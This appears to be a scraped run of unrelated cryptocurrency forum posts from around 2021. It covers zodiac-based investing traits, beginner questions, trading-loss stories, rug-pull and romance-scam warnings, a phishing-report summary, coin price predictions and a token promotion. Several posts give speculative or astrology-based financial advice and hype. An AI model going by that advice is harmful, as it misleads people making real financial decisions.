Your persistence is what keeps you going through sweaty palmed price actions. Combined with intense dedication, you won't be backing down from your initial plan. Every good investor sticks to their plan, and fortunately for you, this quality comes naturally.

Use your stable-minded approach to your benefit. A Taurus acts against making dangerous decisions, instead making secure and well thought out investments. Calm in the face of fears, and ferocious when others are content, you are equipped with the tools for a powerful portfolio.

A Taurus is more likely to be attracted to the Lambo's and Rolex's. Even through your safety and security, material items can be tough to resist. Keep an eye on your spending, and don't let your expensive tastes decide too much of your spending.

&amp;#x200B;

**Gemini** 

As an enthusiast, your passions are your focus. You appreciate some crypto projects deeply, and have a strong understanding of what makes a project stand out from the rest. This hyper focus to detail will aid you in seeking highly potential markets. Do some extra research and trust your intuition.

Sometimes mistakes are made, but you are highly adaptable. Some say you can turn pennies into dimes. Your copious ability to benefit, or strongly mitigate a tragedy is a powerful feature to retain within the crypto space.

Keep your portfolio and decisions private. Your social abilities are abundant, but as an investor, letting on too much information can open vulnerabilities others may be seeking. Practicing deceptive tactics will not offset your inclination to disclose. Try your best to refrain, because any information can be used against you, whether true or false.

&amp;#x200B;

**Cancer** 

Cancer's are well known for being genuine. Others will notice your authenticity and be inclined to offer great information. If you believe in karmic energy, then your caring and helpful nature make you the benefactor of good fortune.

Your investments are best made safely as you are more inclined to take the high road and be careful no matter how confident others may be. You might have a sense of FOMO once in a while, but be assured, your careful approach has saved you more risk than you may even know.

Don't let hardships get you down too much. When an investment plan doesn't pan out, you can be hard on yourself. Bringing yourself down doesn't make a difference in the situation. Always remember that you've made meticulous choices, and in the crypto space, things don't always pan out as expected.

&amp;#x200B;

**Leo** 

Bravery is one of the most highly regarded traits to hold in the crypto market. Coupled with powerful determination, you have the will and strength to thrive with your investments. When others run in fear, you prosper and claim the highest positions as your own just before everyone comes running back with confidence.

As others rally around you, they are influenced by your character. When you are confident in a project, other potential investors will believe you, because they know you mean what you say. Your great charisma should be drawn upon when promoting your endeavors and driving confidence in others.

With great influence, comes the penalty of ego. Although you may be entitled to it, don't let your stubborn persistence keep you from making life changing decisions. Establishing control over a specific project will only cause you to lose sight of other markets that could benefit from your presence.

&amp;#x200B;

**Virgo** 

An analytical mindset is without a doubt one of the most potent qualities in investment. You execute financial decisions guided by logic. Well organized and intensively detail oriented, you are a weapon forged to prosper within the crypto world.

Humbled and introverted, but also capable of charismatic charm, all contributes to the advantage you have in any competition.  Virgo's write the book for investments, and are to be regarded highly as other investors depend on your thoughtful insights.

Heavily detail oriented, you may also be held back in your convictions. Perfectionists struggle to pull the trigger on something that is not just right. It may not always benefit for you to carefully predict the perfect tops, or the absolute bottoms.

&amp;#x200B;

**Libra** 

You live with a natural proclivity to harmony. Where others win with logic and reason, you are more prone to be attracted to markets with high potential. Some might call it luck, but when you are right, it's because of your strong intuitions. People may ask how your predictions are always so accurate.

Others will confide in your guidance. You are an easy person to trust because you are authentically trustworthy. A truthful approach makes you the perfect diplomat. Holding people's trust is as valuable as holding an appreciating asset, because others will see and follow.

Your trustworthiness is not always reflected back at you. Keep on heavy guard, because as a person who sees the world through your eyes, nefarious people will try to use it against you. You are vulnerable to a cleverly plotted scam.

&amp;#x200B;

**Scorpio** 

The solutions you employ are bold and imaginative. Cryptocurrency is where you belong, because you are a pioneer of new ideas and creation. The crypto culture benefits greatly from your presence, as you are a driving force behind positive change and progression. Be sure to apply your resourcefulness whenever possible.

Bold and passionate, you are inclined to courageously dive into a project that you thoroughly believe in. Strong in your convictions, you are likely to pull the trigger on a successful project, where others will hesitate with apprehension.

Not every decision you make will be ideal. Don't get too hung up on your mistakes. Keep forging ahead with your creative mind. You are easily misunderstood, and can also be revengeful. Letting negative outcomes conflict with your progress can draw from your immense value.

&amp;#x200B;

**Sagittarius** 

Determination is a driving force behind your decision making. You benefit from having a plan in place. Set the bar high, because you are compelled to aggressively pursue your goals. You have the personality and perseverance to barrel through any obstacle and meet the goals in place by any investor, so really, set the bar high.

Crypto is sometimes a game of luck and risk. Your open-minded approach can help you to seek out obscure projects where others might not yet see the potential. Lucky for you, luck is on your side. Regarded as one of the most fortunate astrological signs, Sagittarius' are rewarded well if only for being creative and unafraid of the unknown.

Patience is a virtue that should not be disregarded. You will likely struggle with patience. Even with your good fortune, you will be tested and need to fight your agitated mind back to stay on track for the long game. Don't give up when you think it's all over.

&amp;#x200B;

**Capricorn** 

As your friends and family may regard you as the "responsible" one, this trait applied to investing is the most important. You are careful with your finances, and you will benefit from your natural strategy. No other sign is as strategic as the great Capricorn, so be sure to take advantage of this quality.

It takes a thoroughly driven individual to succeed in cryptocurrency. Be sure to make or have a plan, because your competitive edge and persistence will be the backbone of your portfolio. Combined with your strong willed patience, you are equipped to weather any storm no matter the ferocity.

Fear and greed may be the devil on your shoulder. Be aware of your mental state, and don't let it get the better of you. It's only a negative quality, not a true reflection of the person you are. Investment is a risky game, and is no place for self-doubt. Stay hyper focused on your positive qualities, because nothing needs to hold you back.

&amp;#x200B;

**Aquarius** 

You are smart and tactful. You will have the advantage when it comes to doing your research and retaining the information you've learned. Intelligence is your strongest financial tool, so don't be afraid to learn as you go. You will be surprised at how well you can outperform others.

You don't need anyone else to aid you. Recuperative and independent, you make your own way through life, and the same applies to investing in crypto. Often times people are misled by others, but you are invulnerable to this form of deceit when you pay no mind to it at all.

The most intelligent people in the world have been known to also have the messiest rooms and living spaces. Your mind might get scattered with information, and you may feel detached. Don't let the burden of a disorganized mind interfere with your focus on investments.

&amp;#x200B;

**Pisces** 

A Pisces is held to the highest standard of intuition. You may have noticed that when you get a gut feeling, more often than not, you are correct. Delve into learning about as many projects and different aspects as you can. Harness the intuition you have towards each piece of information you gather. This will be of great use when it comes to making final investment decisions.

Creative expression is where many new crypto projects are going. You are well equipped to identify what makes a great NFT or artistic project. You also benefit from the ability to spot projects that are really thinking outside the box. Apply your creativity to your decisions, as it's a strong quality.

Carefully balance your intuition and creativity with your proclivity for impracticality. Sometimes your mind can become full of wonder. You may be dependent on others for validation. Be cognoscente of this web of connected weaknesses, because they may actually work well if you can mitigate them against one another.

&amp;#x200B;

This post took a surprising amount of time and research. Let me know what you think. Hope you enjoy!

For those who watched the Netflix series, they basically take people that are poor and mostly in huge debt, that accept to play a game that kill each other to win an insane amount of cash to fix their lives.

What if the purpose of Squid coin is to make people poor enough to accept playing a real Squid Game and pay the debt created by their Crypto?

Guys wanted to share my stupidity with others so maybe someone will learn from it.

So I have managed to lose like $1.5k in like a month or so.

2 main mistakes I did were panic selling   and buying coins that already pumped like 200-300% thinking it might go lot higher, So basically fomoing .

Dont fomo in guys , sometimes you can make profit but most of the times you will loss money . And invest in projects you believe in so if it drops 20% or even more you will not  panic sell coz you know it will go higher .

Good luck everyone

We are all excited right now. Actually, excited might be an understatement. Your coins are probably pumping. If not then you invested in shitcoins or you listened to this sub. Its practically the same. 

I bet you read multiple articles in here claiming that the bull run will end on December and be prepared for crypto winter and stupid stuff like that. Let me tell you the only true thing  my dear friend this sub has taught me. We don't know shot about fuck.

So as an experienced investor you will sell at the end of October right? Guess what will happen if every one of us does the same? Exactly. 

I am not saying that whales don't manipulate the market and it's in our hands only but if you listen to every motherfucker saying they will sell and you sell also then the crash will definitely become true.

So take your time to rethink and see how things are going. It's an unpredictable market. Bull run can last for many more months or it can end today. Don't try to time the market. If you believe in your choices then hodl and most likely you will be rewarded.

Since negative interest is a thing, I have to pay a quarterly fee to store my fiat currency in a bank account. Would there be any downsides or potential issues with withdrawing all of my fiat (besides what I need for daily expenses) from my bank account, and spend it all on a stablecoin such as USDC?

I could even stake and earn on platforms such as Nexo or Celsius.

I can't seem to locate any issues, other than the staking platform of choice could potentially be hacked and my funds could be drained in an attack.

Before commiting, I would like to hear your perspective on this decision. So please - play devil's advocate!

Hey guys, newbie here, and I have a number of questions for you guys.
What advice would you guys give to someone like me, a newbie, for finding projects with good utility. Its frustrating sometimes when reading whitepapers and just thinking everything I read seems like a good project, but in actuality most of em cant deliver on their promise in terms of use. 

Also, how would you guys organise your portfolio in terms of alts? 

What are things to look for in altcoins? Is it the developers behind it? Partnerships? Deals? Other big companies investing in it? 

Also, could someone help explain Web3.0 in simple terms for me?

These are probably a questions posted a lot on here but Im curious about a few things about crypto trading. I made ~100 from 10 into SHIB recently and want to take trading more seriously, so I have a few questions.

1) how do people find out what coins are rising in popularity, are there websites, Reddit pages, Twitter pages? Do people just guess? 

2) what apps do people use to trade? Ive been using Coinbase and have downloaded binance but being a resident of the uk, Im apprehensive to trade overseas because of tax and stuff like that. I have also downloaded trust wallet, but also dont really know how they work. Any help would be great.

3) how do people buy coins that arent widespread? Things like POLC and OPUL that dont show up on Coinbase, I have no clue what sources are safe to use to buy these coins.

4) lastly, is there anybody here that started with a small amount of money (like 200) that now trades full time or makes a lot of money from trading who can give any tips or tricks that they used. The scene has probably changed overtime but any help would be appreciated heavily.

Thank you guys

I'm generally new to crypto. I have some money in BlockFi because I like their interest rates, and Coinbase but I didn't put any of my money in, just $70 worth of the free crypto you get for taking the quizzes. I was thinking about getting an actual hardware wallet and start trading on the decentralized platforms like pancakeswap. I just have no idea how I'd transfer the crypto I own to this wallet or if it's even worth it. I also would like to know what the fees are to trade on a decentralized platform. Is it worth it to buy a little at a time or will the fees eat up my profit? Also the hardware wallet I am looking into are the ones made by Ledger. If anyone could recommend others that would be great.

Alright I am laughing my ass off. Last week squid game token went from $0.0007926 to $2,861.80 and ended up getting rug pulled sensing the price to almost zero ($0,003) now a few days later people are buying it again.

Today squid game is up 650% to almost $0,1. Once again it got rug pulled.

People couldnt withdraw their funds, they probably cant right now. I wonder if the people making this coin are going rug pull this coin again. 

And I wonder even more if people are going to buy it again after the second rug pull. Its a matter of time.

Please people stop buying this coin.

So its Diwali here in India . Just like Christmas in India we receive a lot of gifts on Diwali from friends and family. Usually a lot of sweets from friends and Cash from family. 

Just as we got to the part where we receive cash, my uncle asks me if I want my "gift" (money) in cash or transferred to my bank account , I chuckle and say  "in crypto" . Just so you know I have no idea he invests in crypto and probably said that because all I did in the last week was stare at the charts. To my surprise he says "Okay tell me your Bitcoin address" , The first thing I said was " You invest in crytpo?"

I  still cant believe that happened, I got $100 worth of Bitcoin on Diwali. Never in  a hundred years I thought  my conservative family would gift me Bitcoin.  

Happy Diwali to you all.

Hi, Im sorry that these will probably be dumb questions. 

I was looking at different wallets on the App Store today and quickly got confused. Is holding crypto in a Binance.US account for example different from holding it in a wallet? Is Staking the act of holding it in a wallet to gain more returns, kinda like a savings account? How do I know which wallet to go with?? Theres so many. Are MetaMask and TokenPocket just another wallet like Moonsafe, Trust, Crypto.com wallet, etc?

From my understanding putting crypto in a wallet gives you the keys to the crypto itself making it more secure? Whereas on Binance you dont have them. In this case should I use Trust wallet to transfer my crypto since its the wallet made by Binance?

If Im wrong what wallets do you all suggest and why?
-------------------------------

Well what i shoul write more than above already asked? Well i try to do so... I used to stak my ZIL so i got some rewards for that, some ZIL and also gZIL... Since minting has finished the price of gZIL went down like h..lll... Well i thought the complete oposite would have happened and the price would already by like 800$...

Would have brought me some nice gains... but it did not happen... i think gZIL will rise back up at some point and may reach back like to those 500$ it had this spring... Like a 5times gain... nice :)

But APENFT what about that...? Who else thinks APENFT could make in the next years (yes long term, 5 years at least) like a 20times gain or even more?

you couldn't really put it on the will without the keys right? I'm alone and also been sick for months. I think it's molde any idk how long I'm gonna live and I remembered about my 0.005 btc  so I wonder do you all have like someone you tell about your crypto or some way to insure someone else would get it? Or would you just spend it on life saving things or donate it somehow last minute or would you just leave it to never be used again?. I wonder what will happen to btc in 100 years after these generations finish their lives. society will probably be unrecognisable Guess I'll never know. Make the most of your time here on this beautiful strange planet friends.

Pretty much the title. My mom, unbeknownst to anyone, put a bunch of money into crypto on coinbase. She then transferred whatever she had on coinbase over to what I assume is a dummy website. She's filed a police report and has gotten in touch with her bank, who say it could be several days before they determine whether any of her money will be covered. Because she transferred to, and then from, coinbase, I assume the bank isn't going to do anything. According to her, she can see her money on the website she transferred everything to, but can't withdraw it. Does anybody have any  advice or know of anything that can be done to reverse this? What the fuck do you do in this situation?Thank you

Usually im very conservative about my portofolio risk management and i usually dont jump into shitcoins and coins on a rise but this time i saw a coin called SLP on a volume rise although the price was like 3% over the last day. Seeing MANA SAND and other gaming tokens pump so hard with over 100% gains in 24hrs, i understood that SLP is also a coin of the same domain, but that hasnt pumped.

So i entered... at 0.08 with 50% of my folio understading this will be my chance of gaining something really big. A few hours later i was already in profit, not much but i was. The day after a decline came and slowly steadily percentages of my money went away as if somebody was pickpocketing me. Fear got into me and i decided to sell at a loss, about a 20% one...

04.11.2021... look at SLP +75% gain F*ck my life. This was the only time i truly felt depressed about what i could have had and what i have lost. I missed a Nitrous Oxide powered train.

Cryptocurrency and decentralized finance, via blockchain, has mitigated the unbridled  hegemony of Big Tech  -- Amazon, Facebook, etc. A bigger battle, however, looms large  -- who will control the metaverse. [FB, Microsoft, Nvidia, Epic Games, Roblox, Unity Software and others have thrown down the gauntlet](https://www.wired.com/story/big-tech-metaverse-internet-consolidation-business/) . 

Decentraland and The Sandbox are early blockchain contenders. However, we need a blockchain with the pedigree of Bitcoin, Ethereum and others who have rattled the cage of centralized legacy institutions. 

Let the games begin!

A Few days ago Crypto.com listed the meme coin Dogelon Mars. knowing it would pump like crazy in the first day i decided to buy.. I saw there was a limit of 5.5B coins a day so i bought a modest 1B cuz why not,  the coin pumped hard and when i was 2x i decided to pull out my initial investment only to find out the limit to trade daily was 35M coins so not only it would take me around 1 month to sell it every day i would get less than 50% of the value, also no withdrawals are available so the users who bought are forced diamond hands. Crypto.com escuse for the price discrepancy is because of spread of low volume coins.. If you buy elon you get charged up to 30% more than the coin is worth and sell it for less than 50% what's is worth. I've benn using their platform for around 2 years and this is the first and last time they fuc*** me . 

For an exchange that advertises you can buy crypto "WITH 0 FEES" they sure have to be stealing from their customers or else how could they have been paying for so many partnerships worldwide 

Also they advertive heavily on their crypto cards but I've seen many reports of users having incorrect amount of money after making transactions ( lower amount than it is supposed to) and no where to find the missing money and when they enquire Crypto.com says they probably spent it with no proof of transactions in sight. 

It's been a few days now and still no withdrawals available for the shitcoin they surely made a lot of money from. 

But anyways this is surely the last time I've done business with them . I would recommend staying away from it. 

I'm posting here cuz their sub is full of fanboys and anyone with a legit problem is silenced and nowhere to be heard again.. 
Cheers everyone

Several days ago, October 20th to be more exact, the price of BTC dipped rather atypically to $8,200, which represents a massive savings (an 80% + discount) for the user who was able to snag BTC at this  price. 

I'm curious if anyone could or has already given a decent explanation of this phenomenon. I understand that this is likely as simple as a glitch in the volume of bot trading trying to fill buy and sell orders, but is there a better way to explain this? I'm not hunting for conspiracy theories here, I just think new folks and others might appreciate understanding how this can happen on an exchange.

A bit of context, earlier today I made a post asking people wether they share their crypto investments with family/friends/partners. There was a huge variation in what people thought. I found this interesting but also quite insightful. It made me think about my own relationships and how Id change my approach after considering these thoughts. With that in mind here is a summary of what people said. 

**How to share in a healthy way:**

* I'll start this off with my personal favorite which was someone suggesting discussing your gains with your pet or baby human for sound feedback. 
* Even if you share, do it in percentages and don't disclose it in fiat terms. This is because once some one knows how much of a currency you have, (e.g. 1 BTC, you wish) they will always know how much fiat you have. They will know for example that in 2021 your bitcoin is worth X amount and in 2025 is worth X amount. It will compromise your privacy forever.
* Always consider the persons situation when sharing. If someone you know has a stable income, is open to investing and is doing well financially then sure why not ? If you know someone who is struggling financially, its probably not a very good idea to go and flex how much you made from Shiba Inu. 
* Consider the persons personality. Is this individual envious/jealous? Will they treat you differently because of your gains? Will this make you a target?
* Discuss the technology and the cryptos themselves and not the amount of money you're making. If this individual is interested, discuss new things you've heard about; news, innovations, interesting projects, etc. It's rare to find 'crypto-enthusiasts' so take advantage.

**Reasons not to share**

* If/when you become successful people stop liking you with reference to ['tall poppy syndrome'](https://en.wikipedia.org/wiki/Tall_poppy_syndrome)
* People will try to utilize you and will have you in the back of their head as 'ATM friend'. This will put you in uncomfortable situations with friends, family, etc.
* People will blame you for not introducing them earlier and of being selfish. Or worse blame you for their losses if you shill them any coins or simply state what you're invested in.
* If the market crashes/if you lose money people will laugh at you and ridicule you.
* One that was specific to sharing with your partner was; share only if you have a kid with your partner and not before that. Or share only when there's a goal in sight, like a down-payment for a house.

**TLDR;** Minimize crypto investment sharing with people. Share only with people you trust and don't throw it in the face of people who are struggling financially. People will treat you differently and try to use you if you become successful .Some people will ridicule your success and laugh at your suffering so be wary.

We all know a bear market is inevitable, my guess is near the start of 2022. These are the coins I strongly believe will get crushed. (Im prepared for mass downvoting) 

First off is SHIB. I think we all know it, a coin driven by pure hype is not sustainable and with a return so high it will not last 

DOGE. I honestly think this would be ALOT less than SHIB but again it is only driven by hype + Elon. 

Catgirl. I dont even know what to say for this, it is spammed in tik tok comment sections and we all know what happens when retail start buying. (Rip to the guy who bought $11mil the other day)

Essentially just shitcoins will get hit the hardest as people start to DCA into coins with strong fundamentals.

Following the shitcoin era falling to its knees we will then have the second set of coins likely to fall. These are DEX coins

We have CAKE, UNI and Sushi swap coins crumbling. This is because people arent buying shitcoins on these  platforms anymore and their volume will fall drastically. People are buying coins with good fundamentals which are likely listed on Binance, coinbase etc.

My opinion on whether this next set of coins will fall is abut shaky and I wouldnt bet on it

SOL: an insane % increase this year. The fact a video of a group of people with billions each are looking to pull out isnt great but Is probably just FUD. Anyway, people buy coins with fundamentals in the bear market. The first thing you see with SOL is how they were able to shut off their entire network, proving to not be decentralised which is a huge fundamental. That said I do think SOL is good for the short term.

ADA: Humans like action and things done quickly which Cardano doesnt achieve in the slightest, as of now they dont have anything going for them and when ETH gas fees fall with ETH2 I think ADA will struggle to compete. I think ADA will fall more than SOL and may even turn out lower than Polkadot

Now just a few more which are high in market Cap. Litecoin because the devs left. Axie infinity because its just a game thats not even well put together. Chainlink because its service is good but theres no use for the actual coin and ETH Classic

Coins I think will do OK: Bitcoin eth dot monero vechain cosmos algo

I recently got into environmental crypto and found an early development project called Changeblock that I think has the potential to change the game when it comes to how the climate markets operate.   

It tokenises carbon emissions assets onto the blockchain using the Ethereum network, in order to facilitate easy access to the climate markets and solve many of its current problems. I took this quote from their discord.    

**How Does It Work?** 

**Step 1:**  The Changeblock Protocol custodies GHG assets into a pool, these assets are verified and the relevant audit documentation and certification is uploaded onto the blockchain.   **Step 2:**  The Changeblock protocol mints one CBLK, backed 1:1 by the custodian credits, providing a fungible tonne of carbon.   

**Step 3:**  Using the CBLK anyone who wishes to mitigate their impact can either retire their credits or hold it for financial or regulatory benefit. Ownership of a CBLK means anyone who needs a GHG credit can now have access to it, instantly, trustlessly and with an immutable ledger showing the history of the credit and its origins.  

**Governance**  The Changeblock platform and ecosystem will operate using the **Changeblock utility token** or (CHNG). CHNG is used for the governance of the protocol. Holders of CHNG will be able to **vote** on proposals, steering the direction and future of the platform.  

They are releasing a whitepaper and are hosting a Q&amp;A on their discord soon. To get the rest of the full details about the project you should check them out.

What is a good and free place to get news about Cryptocurrency, Defi, NFT's, etc? I am new to all of this and I find it hard to keep myself up to date with everything new that's going on. I know this subreddit covers some of the cryptocurrency news but it usually doesn't cover everything. Preferably the website, email subscription, etc. has all of it summarized and written in simple terms (so a beginner can understand) so I don't have to spend a few hours googling definitions and trying to understand complex terminology.

Yesterday someone posted two articles about the movement of the 4 trillion coins....

First one...

 was a small screenshot, maybe Twitter, it talked about the movement of the coins to 4 wallets, then talked about how they staked some because shiba swap value increase by 100 million... Mentioned he used 4 different otc to sell them through Dec.

The second one...

They identified the potential owner... Named him... Named his company... Said he made shitcoins.. And said that his company was being used by shiba inu..

Please help... If you remember reading these articles... Please comment.

If you have location of these articles please link them...

Thank you.

Hi, I'm just another crypto trader from the 3rd world country who stumbled across this sub for quite a while. And I've learnt a lot from this sub to check and DD'ing any projects and platforms for scamming prevention.  


I've met some chicks from that dating apps, but I've found some of the strange patterns that "she got better financial situation from her aunt because the cryptocurrency", and kept this pattern for a while. (yeah, she tried sale pitching to me)  
One day she persuaded me to do "investment" by asking me to buy at least 2000 USDT from the legitimate exchange, which I don't, and persuaded her that it's a way too big an amount to immediately buy (as I have the fixed payment, and paying that huge amount will get me eating instant ramen for the whole month, not so good), so I persuaded to just 100 USDT instead.  


After I've bought 100 USDT, I asked her how to do and what pair in Binance (yup, I'm using the Binance as the main platform), she told me not to transfer into the spot, but transfer into another platform called "BKcoin" (BKCOIN / or type [https://b.bkcoin.name](https://b.bkcoin.name)).  
Once I've opened this platform, she asked me to register but I've done otherwise by checking all trading platforms in CoinMarketCap and showed nothing related to "BKcoin" as any means of the legitimate exchange platform, which showed the big red flag to me.  


What did she tell me? "What we make is the cognitive gap" (yeah, a nice way to tell me that I'm stupid).  
Lastly, she dumped me as "I don't see the point for going on when you think in your heart that I'm going to cost you $100".  


But that $100 is well spent revealing the scammer trying to do the sale pitch, and it is safely in my wallet. :P  


By the way, thanks for this sub for providing me with the knowledge to prevent any scamming.

I didn't invest in Solana when the price was around $40 and it haunts me to this day but that ship has long sailed and I will never FOMO because I already missed out. I honestly think that Solana would eventually start to decline because of their centralized project. I'm not saying that I am correct but I just think that they don't really offer anything that is superior as compared to their upcoming competitors ADA and ALGO. 

Solana is honestly over priced at this point and people have started to show interest in the cheaper projects like ADA and ALGO because these projects are yet to receive the pump they deserve. These projects are highly likely to pump in the bull run because as people take profits they would look to diversify their portfolios in these projects. Many say ADA has pumped already but that is not a valid reason to think that ADA is dead only time would tell.  

This is just the outcome of a progressing system where competition would always exist among different blockchains who's aim is to improve on each other's mistake. I honestly think that Solana would decline in price and rank because of their centralization, increased competition and hype of other projects.

I definitely think that is a good strategy. I dont mean run after squid game or dogelon mars type coins but small cap with potentials. Of course many small caps dont survive even if they have a good team, good white paper or a vision. But this is a risk worth taking. Following are what to look for a small cap gem:

1. A low market cap and a low price is of course the first indicator
2. Team with experience and talent
3. Vision
4. Use cases (what they want to do and how do you relate to it
5. Who has how many coins? First investors, project development, retail etc. 
6. Add some below in the comments if you want

So based on these factors, a small portion can be invested in small coins. The reward is too tempting not to even touch these coins. Think of it as playing the lottery. People do that knowing they will not win almost all the time but there is that small chance you might strike it big. Same here in the crypto world!

Google has given a whopping $1 billion to CME Group  the first platform that launched Bitcoin futures together with CBOE in December 2017, according to the Wall Street Journal.

Along with the investment, a condition came that CME will shift its core trading system to the Google Cloud.

CME works with markets that see trillions of USD circulating in trades every single day. The partnership of the companies will make it easier for CME to land new customers quickly, perform operations seamlessly and build new trading tools based on Google tech. The latter includes AI-based software that monitors market risks.

CME Groups market capitalization value totals almost $80 billion and this platform is the most valuable exchange operator  this status has been awarded to CME recently after it was lost by Hong Kong Exchanges &amp; Clearing Ltd. CME trades multiple markets, including crude oil, gold, and Bitcoin and ETH futures.

Google Cloud is the fourth biggest provider of cloud services. In 2020, it received 6.1 percent of revenues in the cloud infrastructure around the globe, as per the data from Gartner Inc. The largest player in this market is Amazon with a 40 percent market share in 2020, then go Microsoft and Alibaba Group.

The aforementioned $1 billion was invested by Google Cloud in CMEs nonvoting convertible preferred stock. According to the Google Clouds CEO Thomas Kurian, this stands for Googles intention to support not a single company but the transformation of the whole nascent financial system on the planet.

And why? Every cycle has been a little bit different - in 2017 the bull ended (if you think short term ;) ) in January, but I dont think itll be the same this time.

It always has. Major cycles have ended, and the bear has always come so far.

If we think about these lengthening cycles theories, I am predicting we will see the real bear as we know it sometime in spring of 2022.

What do you think and why? Do you think the same as me? Or is the bear further away? Maybe you think its closer than we realize?

Are you a madlad who is instead eternally bullish and were going to $1M BTC no stopping? Well I sure hope that happens!

I know with these things, time isnt the only factor is play on short notice but what is your perspective?

Im sure you all know the feeling. 

Youre in the office/bar/training pitch/course/classroom wherever it may be, and your friend who knows you are big into your crypto currencies hits you with the following opening gambit; 

Dude, so I heard about this SAFESHIBAELON-MARS coin that is like, literally about to 100x, have you heard anything about it.. yeh like so apparently...

You know the rest...

How do you all deal with this situation? 

Now, this friend knows you have been playing with cryptos for a few years or a few months now or however long its been. 

Do you shut him down or do you hear him out?

Heres the reason I ask. I have previously had 100% zero tolerance for this and mentally have to be very strong to restrain myself from saying shut up, man. 

But iv been thinking, is there a better way to channel this enthusiasm into something better for the cryptoverse?

Before the suggestions roll in, a caveat. You have already tried 100s of time to talk crypto, your investments, the benefits of blockchain tech, the future of NFTs etc

None of it worked... but now theres the little cute doggy meme shit coin. 

Is my 0 tolerance fair? What do you do?
Let me know your experiences with friends like this... weve all got them.

If I hold ETH in a Binance Smart Chain wallet (BEP20 token) and I want to send it to a centralized exchange (for example, Binance), do I have to bridge it to ERC20 token to send it or does the centralized exchange hold ETH in multiple chains and therefore I can just send ETH as a BEP20 token? I had to create a Reddit account to ask this question because I can't find this answer anywhere. I can only find questions about sending from an exchange to wallet but I know how that works just not opposite way around. Your help is greatly appreciated :D

Title.              

https://www.youtube.com/watch?v=ktGarjZC8E8 - watch this clip for context. Two college kids get rich while other people lose their jobs and can't pay their mortgages.                  
https://www.youtube.com/watch?v=0k5aVLi_yhM - This is what happens when you get rich from trading or buying speculative options.                 

Someone who told me that he spent a large amount of money on bitcoin in the 300 USD range told me that recently he had a moral issue with selling, buying and discussing stocks and bitcoin with people because when you sell that means you are selling on someone new to the space. Given that this is my own first full bull run that I've been a part of since the last halving began, I must agree that I feel a bit dirty just for being a part of it. Apart from speaking three languages and working in the tech industry, I am not a very skilled individual.                  

In the past two years there's only been a few types of people who have made more money than me: Doctors, Lawyers, highly skilled engineers, and wall street bankers.           

This is just my two cents. Don't go rubbing your wealth in other people's faces. Odds are, someone might have bought the same coin as you to get rich, but didn't properly set up an exit point.

 The scam campaigns, which used Google ads to reach users, has resulted in losses of at least $500,000!

The important points are:

* Users of crypto wallets Metamask and Phantom, as well as the crypto swap platform Pancake have been targeted in a crypto phishing scam involving at least half a million dollars being stolen, according to a Check Point Research (CPR) [report.](https://research.checkpoint.com/2021/cpr-alerts-crypto-wallet-users-of-massive-search-engine-phishing-campaign-that-has-resulted-in-at-least-half-a-million-dollars-being-stolen/)
* CPR said that in the past few days there have been multiple events in which hundreds of crypto wallet users have had their funds stolen while trying to download and install well-known wallets, or change their currencies on crypto swap platforms such as PancakeSwap or Uniswap.
* The scam campaigns used search engine advertisements to target crypto wallet users. They then employed fake URLs and websites to allow scammers to steal wallet passwords and access crypto funds held in wallets, said CPR.
* The report gives an [example ](https://research.checkpoint.com/2021/cpr-alerts-crypto-wallet-users-of-massive-search-engine-phishing-campaign-that-has-resulted-in-at-least-half-a-million-dollars-being-stolen/)of how an attacker uses a Google ad campaign to steal the users private key and access their MetaMask wallet by giving them a phrase that allows them to steal the funds upon transfer.
* CPR advised crypto wallet users to refrain from clicking on ads and only use direct, known URLs.

Whenever I get the free money from coinbase earn, Ive been holding onto it for a while and selling it after its gained about 30-40%. Last night I got extremely lucky and opened Coinbase to see Cartesi at 1.08, which was about a 30% gain in 15 minutes.  
  
I thought the top is soon(top ended up being 1.09), so I tried to sell. First transaction gave me transaction cancelled. The next few times it just gave an error and said try again. After a few minutes it ended up working but by that time the price had already gone back down 10%.  
  
This isnt that terrible for me. I was just trying to sell my free $3 for $4.2, and I still got to sell around $3.8, but I know there have been big controversies in the past about other exchanges doing similar things. I imagine anyone who had serious money in this could have lost hundreds if the same thing happened to them.  
  
Has this happened to many other people? Is there a good reason for Coinbase to do this?

Just had a look at the Coinbase Blog and the first article that jumped out was Now get your paycheck deposited into Coinbase - that just feels a massively irresponsible thing to offer. 

Following the money wherever it takes them and not considering the potential consequences is very dodgy ground ethically.

In the UK at least the Financial Conduct Authority encourages all finance companies to ensure they design for vulnerable users. Every product or service offered should prevent vulnerable people from experiencing harm. The definition of vulnerable is super broad from anyone with gambling addiction, mental or physical impairment, or even someone who may have had hours and pay reduced at work.

Its stuff like this that will bring the regulators and increase calls for crypto to have more controls.

Im a small business owner (music lessons business) in a small town, that shows up frequently to the drive through at my local credit union, to deposit checks that clients write to me. For about a decade now (yes, the number of checks written have gone way down compared to digital transactions in recent years). 

Its a credit union with three branches total, all in this town. Credit unions like that can be very useful as a business owner - you cant drive to and knock on the door of the Vice President of Capital One, but you can with small credit unions. This info helps underscore my (and the tellers) exasperation further. 

This day was like any other day, but on this day, a check was returned to me in the drive through.

Sometimes when a kids Grandma writes a check, they might misspell my last name or forget what the exact number is, so they scribble a bit over and fix it. That was the case, they got a number wrong. And it was clearly fixed. Like, if youre a human, you can clearly see the correct information. 

From the teller at the window -

Our bank has a new policy that if there is a blemish on the check that is a handwriting mistake or corrected info - *despite the fact that we have months and months of bank statements showing the exact transaction amount specified here, and the customer had corrected their check to reflect to that amount, if our check verification department decides that they want to charge you $25 for that, they will, and they will hand the check back and not deposit it.*

I asked her to repeat that, because that is insane. 

There were 2 tellers at the window that started piping up - Yes. That is correct. They all had a very strong  look. 

Can they just  *look* at it first and then call? Thats whats happened in the past. And Im talking about checks where they wrote the wrong name of a teacher or I forgot to endorse the back of. Someone scribbling a numerical 2 in place of a 5 - does that deserve risking almost one quarter of the months pay from the check, just to find out if I *really* have to go and track down this customer and make them rewrite it?

They can look. If it doesnt pass their inspection, they *will* charge $25 without consulting you first.

You could tell that the bank employees had decided on a moral obligation to customers to hamstring this policy by telling customers about it. They were stressed AF just from this interaction. Who knows what other awful things theyre refusing to do?

TLDR:

&gt;*Coin Hunt* is a mobile game that lets you earn crypto while exploring your neighborhood. Discover keys and unlock rewards. Play individually or with a team!

Hello All!

Previous posts: [Impressions after day 1](https://www.reddit.com/r/CryptoCurrency/comments/q4wiaf/anyone_here_from_the_uk_and_playing_coin_hunt/) and [Impressions after day 5](https://www.reddit.com/r/CryptoCurrency/comments/q5tv9n/coin_world_hunt_impressions_after_playing_for_5/)

